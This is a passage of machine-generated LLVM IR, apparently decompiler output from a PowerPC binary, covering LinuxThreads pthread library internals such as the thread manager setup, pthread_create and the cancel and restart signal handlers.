  uselistorder i32 %v2_1001420c, { 0, 2, 1, 4, 3, 5, 7, 6, 9, 8, 10 }
  uselistorder i32 %v2_10014178, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v2_10014158, { 1, 2, 0 }
  uselistorder i32 %v3_10014130, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32* @global_var_1004520c.991, { 1, 0 }
  uselistorder label %dec_label_pc_1001426c, { 1, 0 }
  uselistorder label %dec_label_pc_1001420c, { 1, 0 }
  uselistorder label %dec_label_pc_10014178, { 1, 0 }
  uselistorder label %dec_label_pc_10014130, { 1, 0 }
  uselistorder label %dec_label_pc_10014120, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v3_10014298 = load i32, i32* @global_var_100451d0.1004, align 4
  %v2_1001429c = inttoptr i32 %v3_10014298 to i32*
  store i32 1, i32* %v2_1001429c, align 4
  %v3_100142a4 = load i32, i32* @global_var_100451bc.995, align 4
  %v3_100142a8 = icmp eq i32 %v3_100142a4, 0
  br i1 %v3_100142a8, label %dec_label_pc_100142b0, label %dec_label_pc_100142b4

dec_label_pc_100142b0:                            ; preds = %entry
  store i32 268518068, i32* @lr, align 4
  %v1_100142b0 = call i32 @pthread_initialize(i32 268697600)
  br label %dec_label_pc_100142b4

dec_label_pc_100142b4:                            ; preds = %entry, %dec_label_pc_100142b0
  store i32 268697600, i32* %r30.global-to-local, align 4
  %v3_100142bc = load i32, i32* @global_var_10045234.1005, align 4
  %v1_100142c0 = mul i32 %v3_100142bc, 2
  %v1_100142c4 = add i32 %v1_100142c0, -32
  store i32 %v1_100142c4, i32* @r3, align 4
  store i32 268518092, i32* @lr, align 4
  %v0_100142c8 = call i32 @malloc()
  %v3_100142cc = icmp eq i32 %v0_100142c8, 0
  store i32 %v0_100142c8, i32* @global_var_100451c0.987, align 4
  br i1 %v3_100142cc, label %dec_label_pc_100144a8, label %dec_label_pc_100142e0

dec_label_pc_100142e0:                            ; preds = %dec_label_pc_100142b4
  %v3_100142e0 = load i32, i32* @global_var_10045234.1005, align 4
  %v2_100142e8 = ptrtoint i32* %stack_var_-184 to i32
  %v1_100142ec = mul i32 %v3_100142e0, 2
  %v2_100142f0 = add i32 %v0_100142c8, -32
  %v1_100142f4 = add i32 %v2_100142f0, %v1_100142ec
  store i32 %v1_100142f4, i32* @global_var_100451c4.988, align 4
  store i32 268518144, i32* @lr, align 4
  %v2_100142fc = call i32 @__GI_pipe(i32 %v2_100142e8, i32 %v1_100142f4)
  %v3_10014300 = icmp eq i32 %v2_100142fc, -1
  br i1 %v3_10014300, label %dec_label_pc_10014308, label %dec_label_pc_10014314

dec_label_pc_10014308:                            ; preds = %dec_label_pc_100142e0
  %v3_10014308 = load i32, i32* @global_var_100451c0.987, align 4
  store i32 %v3_10014308, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10014310.1006 to i32), i32* @lr, align 4
  %v0_1001430c = call i32 @free()
  br label %dec_label_pc_10014410

dec_label_pc_10014314:                            ; preds = %dec_label_pc_100142e0
  %v3_10014318 = load i32, i32* @global_var_100451d8.1007, align 4
  %v3_1001431c = icmp eq i32 %v3_10014318, 0
  br i1 %v3_1001431c, label %dec_label_pc_1001432cthread-pre-split, label %dec_label_pc_10014324

dec_label_pc_10014324:                            ; preds = %dec_label_pc_10014314
  store i32 %v3_10014318, i32* @global_var_10040a5c.1008, align 4
  br label %dec_label_pc_1001432c

dec_label_pc_1001432cthread-pre-split:            ; preds = %dec_label_pc_10014314
  %v3_10014334.pr = load i32, i32* @global_var_10040a5c.1008, align 4
  br label %dec_label_pc_1001432c

dec_label_pc_1001432c:                            ; preds = %dec_label_pc_1001432cthread-pre-split, %dec_label_pc_10014324
  %v3_10014334 = phi i32 [ %v3_10014334.pr, %dec_label_pc_1001432cthread-pre-split ], [ %v3_10014318, %dec_label_pc_10014324 ]
  %v3_10014338 = icmp eq i32 %v3_10014334, 0
  br i1 %v3_10014338, label %dec_label_pc_100143c8, label %dec_label_pc_10014340

dec_label_pc_10014340:                            ; preds = %dec_label_pc_1001432c
  %v3_10014344 = load i32, i32* @global_var_100451f0.1009, align 4
  %v3_10014348 = load i32, i32* @global_var_10040a60.1010, align 4
  %v2_1001434c = or i32 %v3_10014348, %v3_10014344
  %v1_10014350 = and i32 %v2_1001434c, 128
  %v3_10014350 = icmp eq i32 %v1_10014350, 0
  br i1 %v3_10014350, label %dec_label_pc_100143c8, label %dec_label_pc_10014358

dec_label_pc_10014358:                            ; preds = %dec_label_pc_10014340
  store i32 0, i32* @r4, align 4
  %v3_10014364 = load i32, i32* bitcast (i32** @global_var_10040abc.1013 to i32*), align 4
  store i32 %v3_10014364, i32* @r3, align 4
  store i32 268518252, i32* @lr, align 4
  %v0_10014368 = call i32 @__pthread_lock()
  %v3_1001436c = load i32, i32* @global_var_100451c4.988, align 4
  %v3_10014370 = load i32, i32* %stack_var_-184, align 4
  store i32 268518280, i32* @lr, align 4
  %v4_10014384 = call i32 @clone(i32 268527288, i32 %v3_1001436c, i32 3840, i32 %v3_10014370)
  store i32 %v4_10014384, i32* @r3, align 4
  %v3_10014388 = icmp eq i32 %v4_10014384, -1
  store i32 %v4_10014384, i32* %r30.global-to-local, align 4
  br i1 %v3_10014388, label %dec_label_pc_100143b8, label %dec_label_pc_10014394

dec_label_pc_10014394:                            ; preds = %dec_label_pc_10014358
  %v0_10014398 = load i32, i32* @r31, align 4
  store i32 %v0_10014398, i32* @global_var_10040c4c.1014, align 4
  store i32 8, i32* @global_var_10040c48.1015, align 4
  store i32 2049, i32* @global_var_10040ab0.1016, align 4
  store i32 %v4_10014384, i32* @global_var_10040ab4.985, align 4
  store i32 %v0_10014398, i32* @global_var_100451f8.1017, align 4
  %v1_100143b4 = call i32 @__linuxthreads_create_event(i32 268697600)
  br label %dec_label_pc_100143b8

dec_label_pc_100143b8:                            ; preds = %dec_label_pc_10014358, %dec_label_pc_10014394
  %v3_100143b8 = load i32, i32* bitcast (i32** @global_var_10040abc.1013 to i32*), align 4
  store i32 %v3_100143b8, i32* @r3, align 4
  store i32 268518336, i32* @lr, align 4
  %v0_100143bc = call i32 @__pthread_unlock()
  %v0_100143c0 = load i32, i32* %r30.global-to-local, align 4
  %v3_100143c0 = icmp eq i32 %v0_100143c0, 0
  br i1 %v3_100143c0, label %dec_label_pc_100143c8, label %dec_label_pc_100143ec

dec_label_pc_100143c8:                            ; preds = %dec_label_pc_100143b8, %dec_label_pc_10014340, %dec_label_pc_1001432c
  %v3_100143cc = load i32, i32* %stack_var_-184, align 4
  %v3_100143d0 = load i32, i32* @global_var_100451c4.988, align 4
  store i32 268518376, i32* @lr, align 4
  %v4_100143e4 = call i32 @clone(i32 268525540, i32 %v3_100143d0, i32 3840, i32 %v3_100143cc)
  store i32 %v4_100143e4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100143ec

dec_label_pc_100143ec:                            ; preds = %dec_label_pc_100143b8, %dec_label_pc_100143c8
  %v0_1001442c = phi i32 [ %v4_100143e4, %dec_label_pc_100143c8 ], [ %v0_100143c0, %dec_label_pc_100143b8 ]
  %v3_100143ec = icmp eq i32 %v0_1001442c, -1
  br i1 %v3_100143ec, label %dec_label_pc_100143f4, label %dec_label_pc_10014418

dec_label_pc_100143f4:                            ; preds = %dec_label_pc_100143ec
  %v3_100143f8 = load i32, i32* @global_var_100451c0.987, align 4
  store i32 %v3_100143f8, i32* @r3, align 4
  store i32 268518400, i32* @lr, align 4
  %v0_100143fc = call i32 @free()
  %v3_10014400 = load i32, i32* %stack_var_-184, align 4
  store i32 268518408, i32* @lr, align 4
  %v1_10014404 = call i32 @__libc_close(i32 %v3_10014400)
  store i32 268518416, i32* @lr, align 4
  %v1_1001440c = call i32 @__libc_close(i32 %tmp2)
  br label %dec_label_pc_10014410

dec_label_pc_10014410:                            ; preds = %dec_label_pc_10014308, %dec_label_pc_100143f4
  br label %dec_label_pc_100144a8

dec_label_pc_10014418:                            ; preds = %dec_label_pc_100143ec
  %v3_10014420 = load i32, i32* @global_var_100451fc.1018, align 4
  store i32 %v0_1001442c, i32* @global_var_10040ab4.985, align 4
  %v3_10014430 = icmp eq i32 %v3_10014420, 0
  store i32 %tmp2, i32* @global_var_100450c4.984, align 4
  %v3_10014440 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10014440, i32* @global_var_100451dc.989, align 4
  store i32 2049, i32* @global_var_10040ab0.1016, align 4
  br i1 %v3_10014430, label %dec_label_pc_10014470, label %dec_label_pc_10014454

dec_label_pc_10014454:                            ; preds = %dec_label_pc_10014418
  %v3_10014458 = load i32, i32* @global_var_100450ec.994, align 4
  %tmp8 = icmp slt i32 %v3_10014458, 1
  br i1 %tmp8, label %dec_label_pc_10014470, label %dec_label_pc_10014464

dec_label_pc_10014464:                            ; preds = %dec_label_pc_10014454
  store i32 268518504, i32* @lr, align 4
  %v1_10014464 = call i32 @__GI_raise(i32 %v3_10014458)
  %v0_10014468 = load i32, i32* @r2, align 4
  store i32 %v0_10014468, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10014470.1019 to i32), i32* @lr, align 4
  %v0_1001446c = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_10014470

dec_label_pc_10014470:                            ; preds = %dec_label_pc_10014454, %dec_label_pc_10014418, %dec_label_pc_10014464
  %v2_1001447c = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_10014478

dec_label_pc_10014478:                            ; preds = %dec_label_pc_10014494, %dec_label_pc_10014470
  %v3_10014480 = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268518540, i32* @lr, align 4
  %v2_10014488 = call i32 @__libc_write(i32 %v3_10014480, i32 %v2_1001447c)
  %v3_1001448c = icmp eq i32 %v2_10014488, -1
  br i1 %v3_1001448c, label %dec_label_pc_10014494, label %dec_label_pc_100144a4

dec_label_pc_10014494:                            ; preds = %dec_label_pc_10014478
  %v0_10014494 = call i32 @__errno_location()
  %v1_10014498 = inttoptr i32 %v0_10014494 to i32*
  %v2_10014498 = load i32, i32* %v1_10014498, align 4
  %v3_1001449c = icmp eq i32 %v2_10014498, 4
  br i1 %v3_1001449c, label %dec_label_pc_10014478, label %dec_label_pc_100144a4

dec_label_pc_100144a4:                            ; preds = %dec_label_pc_10014478, %dec_label_pc_10014494
  br label %dec_label_pc_100144a8

dec_label_pc_100144a8:                            ; preds = %dec_label_pc_100142b4, %dec_label_pc_10014410, %dec_label_pc_100144a4
  %v0_100144b8 = phi i32 [ -1, %dec_label_pc_100142b4 ], [ -1, %dec_label_pc_10014410 ], [ 0, %dec_label_pc_100144a4 ]
  ret i32 %v0_100144b8

; uselistorder directives
  uselistorder i32 %v3_10014318, { 1, 0, 2 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_100144a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100144a4, { 1, 0 }
  uselistorder label %dec_label_pc_10014470, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014410, { 1, 0 }
  uselistorder label %dec_label_pc_100143ec, { 1, 0 }
  uselistorder label %dec_label_pc_100143b8, { 1, 0 }
  uselistorder label %dec_label_pc_100142b4, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v0_100144bc = load i32, i32* @r3, align 4
  %v1_100144bc = call i32 @pthread_initialize(i32 %v0_100144bc)
  ret i32 %v1_100144bc

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @__pthread_initialize_minimal(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100408c0 to i32), i32* @r2, align 4
  %v2_100144d8 = call i32 @__libc_pthread_init(i32 0, i32 268697600)
  store i32 %v2_100144d8, i32* @global_var_100451d0.1004, align 4
  ret i32 %v2_100144d8
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 %tmp, i32* @r27, align 4
  %v0_10014518 = load i32, i32* @r2, align 4
  store i32 %v0_10014518, i32* @r31, align 4
  %v3_1001451c = load i32, i32* @global_var_100450c4.984, align 4
  %tmp13 = icmp sgt i32 %v3_1001451c, -1
  br i1 %tmp13, label %dec_label_pc_10014538, label %dec_label_pc_10014528

dec_label_pc_10014528:                            ; preds = %entry
  store i32 268518700, i32* @lr, align 4
  %v1_10014528 = call i32 @__pthread_initialize_manager(i32 268697600)
  %v1_1001452c = icmp slt i32 %v1_10014528, 0
  br i1 %v1_1001452c, label %dec_label_pc_100145ac, label %dec_label_pc_10014528.dec_label_pc_10014538_crit_edge

dec_label_pc_10014528.dec_label_pc_10014538_crit_edge: ; preds = %dec_label_pc_10014528
  %v0_10014558.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014538

dec_label_pc_10014538:                            ; preds = %dec_label_pc_10014528.dec_label_pc_10014538_crit_edge, %entry
  %v0_10014558 = phi i32 [ %v0_10014558.pre, %dec_label_pc_10014528.dec_label_pc_10014538_crit_edge ], [ %v0_10014518, %entry ]
  %v2_10014544 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v0_10014558, i32* %stack_var_-184, align 4
  store i32 268518752, i32* @lr, align 4
  %v3_1001455c = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_10014544)
  %v2_10014564 = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_10014560

dec_label_pc_10014560:                            ; preds = %dec_label_pc_1001457c, %dec_label_pc_10014538
  %v3_10014568 = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268518772, i32* @lr, align 4
  %v2_10014570 = call i32 @__libc_write(i32 %v3_10014568, i32 %v2_10014564)
  %v3_10014574 = icmp eq i32 %v2_10014570, -1
  br i1 %v3_10014574, label %dec_label_pc_1001457c, label %dec_label_pc_1001458c

dec_label_pc_1001457c:                            ; preds = %dec_label_pc_10014560
  %v0_1001457c = call i32 @__errno_location()
  %v1_10014580 = inttoptr i32 %v0_1001457c to i32*
  %v2_10014580 = load i32, i32* %v1_10014580, align 4
  %v3_10014584 = icmp eq i32 %v2_10014580, 4
  br i1 %v3_10014584, label %dec_label_pc_10014560, label %dec_label_pc_1001458c

dec_label_pc_1001458c:                            ; preds = %dec_label_pc_10014560, %dec_label_pc_1001457c
  %v0_1001458c = load i32, i32* @r31, align 4
  store i32 %v0_1001458c, i32* @r3, align 4
  store i32 268518804, i32* @lr, align 4
  %v1_10014590 = call i32 @suspend(i32 %v0_1001458c)
  %v0_10014594 = load i32, i32* @r31, align 4
  %v1_10014594 = add i32 %v0_10014594, 52
  %v2_10014594 = inttoptr i32 %v1_10014594 to i32*
  %v3_10014594 = load i32, i32* %v2_10014594, align 4
  %v3_10014598 = icmp eq i32 %v3_10014594, 0
  br i1 %v3_10014598, label %dec_label_pc_100145a0, label %dec_label_pc_100145a8

dec_label_pc_100145a0:                            ; preds = %dec_label_pc_1001458c
  %v1_100145a0 = add i32 %v0_10014594, 48
  %v2_100145a0 = inttoptr i32 %v1_100145a0 to i32*
  %v3_100145a0 = load i32, i32* %v2_100145a0, align 4
  %v1_100145a4 = load i32, i32* @r27, align 4
  %v2_100145a4 = inttoptr i32 %v1_100145a4 to i32*
  store i32 %v3_100145a0, i32* %v2_100145a4, align 4
  %v0_100145a8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100145a8

dec_label_pc_100145a8:                            ; preds = %dec_label_pc_1001458c, %dec_label_pc_100145a0
  %v0_100145a8 = phi i32 [ %v0_10014594, %dec_label_pc_1001458c ], [ %v0_100145a8.pre, %dec_label_pc_100145a0 ]
  %v1_100145a8 = add i32 %v0_100145a8, 52
  %v2_100145a8 = inttoptr i32 %v1_100145a8 to i32*
  %v3_100145a8 = load i32, i32* %v2_100145a8, align 4
  br label %dec_label_pc_100145ac

dec_label_pc_100145ac:                            ; preds = %dec_label_pc_10014528, %dec_label_pc_100145a8
  %v0_100145bc = phi i32 [ 11, %dec_label_pc_10014528 ], [ %v3_100145a8, %dec_label_pc_100145a8 ]
  ret i32 %v0_100145bc

; uselistorder directives
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder label %dec_label_pc_100145ac, { 1, 0 }
  uselistorder label %dec_label_pc_100145a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001458c, { 1, 0 }
}

define i32 @pthread_handle_sigcancel() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100145c4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100145c4, i32* %stack_var_-16, align 4
  %v5_100145c4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 ptrtoint (i32* @global_var_10040aa0.1011 to i32), i32* %r9.global-to-local, align 4
  %v0_100145d0 = load i32, i32* @r2, align 4
  %v4_100145d0 = icmp eq i32 %v0_100145d0, ptrtoint (i32* @global_var_10040aa0.1011 to i32)
  store i32 %v0_100145d0, i32* %r11.global-to-local, align 4
  br i1 %v4_100145d0, label %dec_label_pc_100145e0, label %dec_label_pc_1001464c

dec_label_pc_100145e0:                            ; preds = %entry
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100145e8 = load i32, i32* @global_var_100451c0.987, align 4
  %v2_100145ec = icmp ult i32 %v5_100145c4, %v3_100145e8
  br i1 %v2_100145ec, label %dec_label_pc_10014614, label %dec_label_pc_100145f4

dec_label_pc_100145f4:                            ; preds = %dec_label_pc_100145e0
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100145f8 = load i32, i32* @global_var_100451c4.988, align 4
  %v2_100145fc = icmp ult i32 %v5_100145c4, %v3_100145f8
  br i1 %v2_100145fc, label %dec_label_pc_1001462c, label %dec_label_pc_10014614

dec_label_pc_10014610:                            ; preds = %dec_label_pc_10014620, %dec_label_pc_10014614
  %v1_10014610 = add i32 %v0_10014610, 16
  br label %dec_label_pc_10014614

dec_label_pc_10014614:                            ; preds = %dec_label_pc_100145e0, %dec_label_pc_100145f4, %dec_label_pc_10014610
  %v0_10014610 = phi i32 [ %v1_10014610, %dec_label_pc_10014610 ], [ ptrtoint (i32* @global_var_10040d60.1020 to i32), %dec_label_pc_100145f4 ], [ ptrtoint (i32* @global_var_10040d60.1020 to i32), %dec_label_pc_100145e0 ]
  store i32 %v0_10014610, i32* %r9.global-to-local, align 4
  %v1_10014614 = add i32 %v0_10014610, 8
  %v2_10014614 = inttoptr i32 %v1_10014614 to i32*
  %v3_10014614 = load i32, i32* %v2_10014614, align 4
  store i32 %v3_10014614, i32* %r11.global-to-local, align 4
  %v3_10014618 = icmp ugt i32 %v5_100145c4, %v3_10014614
  br i1 %v3_10014618, label %dec_label_pc_10014610, label %dec_label_pc_10014620

dec_label_pc_10014620:                            ; preds = %dec_label_pc_10014614
  %v1_10014620 = add i32 %v0_10014610, 12
  %v2_10014620 = inttoptr i32 %v1_10014620 to i32*
  %v3_10014620 = load i32, i32* %v2_10014620, align 4
  %v2_10014624 = icmp ult i32 %v5_100145c4, %v3_10014620
  br i1 %v2_10014624, label %dec_label_pc_10014610, label %dec_label_pc_1001462c.loopexit

dec_label_pc_1001462c.loopexit:                   ; preds = %dec_label_pc_10014620
  br label %dec_label_pc_1001462c

dec_label_pc_1001462c:                            ; preds = %dec_label_pc_1001462c.loopexit, %dec_label_pc_100145f4
  %v0_10014644 = phi i32 [ %v3_10014614, %dec_label_pc_1001462c.loopexit ], [ ptrtoint (i32* @global_var_10040aa0.1011 to i32), %dec_label_pc_100145f4 ]
  store i32 ptrtoint (i32* @global_var_10040aa0.1011 to i32), i32* %r9.global-to-local, align 4
  %v4_10014634 = icmp eq i32 %v0_10014644, ptrtoint (i32* @global_var_10040aa0.1011 to i32)
  br i1 %v4_10014634, label %dec_label_pc_1001463c, label %dec_label_pc_10014644

dec_label_pc_1001463c:                            ; preds = %dec_label_pc_1001462c
  store i32 ptrtoint (i32* @global_var_10014640.1021 to i32), i32* @lr, align 4
  %v1_1001463c = call i32 @__pthread_manager_sighandler(i32 ptrtoint (i32* @global_var_10040aa0.1011 to i32))
  store i32 %v1_1001463c, i32* @r3, align 4
  br label %dec_label_pc_100146d4

dec_label_pc_10014644:                            ; preds = %dec_label_pc_1001462c
  store i32 %v0_10014644, i32* @r2, align 4
  store i32 %v0_10014644, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001464c

dec_label_pc_1001464c:                            ; preds = %entry, %dec_label_pc_10014644
  %v0_10014664 = phi i32 [ %v0_100145d0, %entry ], [ %v0_10014644, %dec_label_pc_10014644 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014650 = load i32, i32* @global_var_100451c8.1022, align 4
  %v3_10014654 = icmp eq i32 %v3_10014650, 0
  br i1 %v3_10014654, label %dec_label_pc_1001468c, label %dec_label_pc_1001465c

dec_label_pc_1001465c:                            ; preds = %dec_label_pc_1001464c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014660 = load i32, i32* @global_var_100450c0, align 4
  %v4_10014664 = icmp eq i32 %v0_10014664, %v3_10014660
  br i1 %v4_10014664, label %dec_label_pc_1001466c, label %dec_label_pc_10014680

dec_label_pc_1001466c:                            ; preds = %dec_label_pc_1001465c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014674 = load i32, i32* @global_var_10040ab4.985, align 4
  store i32 268519040, i32* @lr, align 4
  %v3_1001467c = call i32 @waitpid(i32 %v3_10014674, i32 0, i32 -2147483648)
  br label %dec_label_pc_10014680

dec_label_pc_10014680:                            ; preds = %dec_label_pc_1001465c, %dec_label_pc_1001466c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10014684 = load i32, i32* @global_var_100451cc.1023, align 4
  %v1_10014688 = call i32 @__GI__exit(i32 %v3_10014684)
  store i32 %v1_10014688, i32* @r3, align 4
  %v0_1001468c.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001468c

dec_label_pc_1001468c:                            ; preds = %dec_label_pc_1001464c, %dec_label_pc_10014680
  %v0_100146a4 = phi i32 [ %v0_10014664, %dec_label_pc_1001464c ], [ %v0_1001468c.pre, %dec_label_pc_10014680 ]
  %v1_1001468c = add i32 %v0_100146a4, 66
  %v2_1001468c = inttoptr i32 %v1_1001468c to i8*
  %v3_1001468c = load i8, i8* %v2_1001468c, align 1
  %v3_10014690 = icmp eq i8 %v3_1001468c, 0
  br i1 %v3_10014690, label %dec_label_pc_100146d4, label %dec_label_pc_10014698

dec_label_pc_10014698:                            ; preds = %dec_label_pc_1001468c
  %v1_10014698 = add i32 %v0_100146a4, 64
  %v2_10014698 = inttoptr i32 %v1_10014698 to i8*
  %v3_10014698 = load i8, i8* %v2_10014698, align 1
  %v4_10014698 = zext i8 %v3_10014698 to i32
  store i32 %v4_10014698, i32* %r9.global-to-local, align 4
  %v3_1001469c = icmp eq i8 %v3_10014698, 0
  br i1 %v3_1001469c, label %dec_label_pc_100146a4, label %dec_label_pc_100146d4

dec_label_pc_100146a4:                            ; preds = %dec_label_pc_10014698
  %v1_100146a4 = add i32 %v0_100146a4, 65
  %v2_100146a4 = inttoptr i32 %v1_100146a4 to i8*
  %v3_100146a4 = load i8, i8* %v2_100146a4, align 1
  %v3_100146a8 = icmp eq i8 %v3_100146a4, 1
  br i1 %v3_100146a8, label %dec_label_pc_100146b0, label %dec_label_pc_100146bc

dec_label_pc_100146b0:                            ; preds = %dec_label_pc_100146a4
  %v0_100146b8 = call i32 @__pthread_do_exit()
  %v0_100146bc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100146bc

dec_label_pc_100146bc:                            ; preds = %dec_label_pc_100146a4, %dec_label_pc_100146b0
  %v1_100146c8 = phi i32 [ %v0_100146a4, %dec_label_pc_100146a4 ], [ %v0_100146bc.pre, %dec_label_pc_100146b0 ]
  %v1_100146bc = add i32 %v1_100146c8, 40
  %v2_100146bc = inttoptr i32 %v1_100146bc to i32*
  %v3_100146bc = load i32, i32* %v2_100146bc, align 4
  store i32 %v3_100146bc, i32* @r3, align 4
  %v3_100146c0 = icmp eq i32 %v3_100146bc, 0
  br i1 %v3_100146c0, label %dec_label_pc_100146d4, label %dec_label_pc_100146c8

dec_label_pc_100146c8:                            ; preds = %dec_label_pc_100146bc
  %v0_100146c8 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_100146c8, i32* %v2_100146bc, align 4
  store i32 268519124, i32* @lr, align 4
  %v0_100146d0 = load i32, i32* @r3, align 4
  %v2_100146d0 = call i32 @siglongjmp(i32 %v0_100146d0, i32 1)
  store i32 %v2_100146d0, i32* @r3, align 4
  br label %dec_label_pc_100146d4

dec_label_pc_100146d4:                            ; preds = %dec_label_pc_10014698, %dec_label_pc_100146bc, %dec_label_pc_1001468c, %dec_label_pc_1001463c, %dec_label_pc_100146c8
  %v0_100146e0 = load i32, i32* @r3, align 4
  ret i32 %v0_100146e0

; uselistorder directives
  uselistorder i32 %v0_10014644, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10014610, { 1, 2, 3, 0 }
  uselistorder i32 %v5_100145c4, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9 }
  uselistorder i32* %r11.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100146d4, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100146bc, { 1, 0 }
  uselistorder label %dec_label_pc_1001468c, { 1, 0 }
  uselistorder label %dec_label_pc_10014680, { 1, 0 }
  uselistorder label %dec_label_pc_1001464c, { 1, 0 }
  uselistorder label %dec_label_pc_10014614, { 2, 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_100146f0 = load i32, i32* @r2, align 4
  %v2_100146f0 = add i32 %v1_100146f0, 32
  %v3_100146f0 = inttoptr i32 %v2_100146f0 to i32*
  store i32 %arg1, i32* %v3_100146f0, align 4
  %v0_100146f4 = load i32, i32* @r2, align 4
  %v1_100146f4 = add i32 %v0_100146f4, 36
  %v2_100146f4 = inttoptr i32 %v1_100146f4 to i32*
  %v3_100146f4 = load i32, i32* %v2_100146f4, align 4
  %v3_100146f8 = icmp eq i32 %v3_100146f4, 0
  br i1 %v3_100146f8, label %entry.dec_label_pc_1001470c_crit_edge, label %dec_label_pc_10014700

entry.dec_label_pc_1001470c_crit_edge:            ; preds = %entry
  %v0_10014718.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001470c

dec_label_pc_10014700:                            ; preds = %entry
  store i32 %v3_100146f4, i32* %r3.global-to-local, align 4
  store i32 268519180, i32* @lr, align 4
  %v2_10014708 = call i32 @siglongjmp(i32 %v3_100146f4, i32 1)
  store i32 %v2_10014708, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001470c

dec_label_pc_1001470c:                            ; preds = %entry.dec_label_pc_1001470c_crit_edge, %dec_label_pc_10014700
  %v0_10014718 = phi i32 [ %v0_10014718.pre, %entry.dec_label_pc_1001470c_crit_edge ], [ %v2_10014708, %dec_label_pc_10014700 ]
  ret i32 %v0_10014718

; uselistorder directives
  uselistorder i32 %v3_100146f4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder label %dec_label_pc_1001470c, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10014730 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10014738 = add i32 %v1_10014730, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %tmp, i32* %r28.global-to-local, align 4
  store i32 %v2_10014738, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268519252, i32* @lr, align 4
  %v0_10014750 = call i32 @__pthread_lock()
  store i32 %v0_10014750, i32* %r3.global-to-local, align 4
  %v0_10014754 = load i32, i32* @r31, align 4
  %v1_10014754 = add i32 %v0_10014754, 8
  %v2_10014754 = inttoptr i32 %v1_10014754 to i32*
  %v3_10014754 = load i32, i32* %v2_10014754, align 4
  store i32 %v0_10014754, i32* @r3, align 4
  %v3_1001475c = icmp eq i32 %v3_10014754, 0
  br i1 %v3_1001475c, label %dec_label_pc_10014770, label %dec_label_pc_10014764

dec_label_pc_10014764:                            ; preds = %entry
  %v1_10014764 = add i32 %v3_10014754, 16
  %v2_10014764 = inttoptr i32 %v1_10014764 to i32*
  %v3_10014764 = load i32, i32* %v2_10014764, align 4
  %v0_10014768 = load i32, i32* @r29, align 4
  %v4_10014768 = icmp eq i32 %v0_10014768, %v3_10014764
